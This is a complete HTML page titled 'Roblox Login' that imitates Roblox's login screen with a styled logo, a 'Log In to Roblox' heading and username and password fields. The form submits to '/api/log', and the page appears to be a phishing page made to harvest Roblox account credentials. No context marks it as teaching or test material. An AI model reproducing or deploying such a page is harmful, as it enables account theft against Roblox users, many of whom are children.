<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Login</title>
<style>
body{font-family:Arial;background:#f2f4f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;width:360px;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.logo{text-align:center;font-size:32px;font-weight:900;margin-bottom:8px}
.logo span{color:#00a2ff}
h2{text-align:center;font-size:20px;margin:0 0 24px}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#00a2ff;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;margin-top:12px;cursor:pointer}
</style>
</head>
<body>
<div class="card">
<div class="logo">R<span>o</span>blox</div>
<h2>Log In to Roblox</h2>
<form action="/api/log" method="POST">
<input type="text" name="username" placeholder="Username/Email/Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>
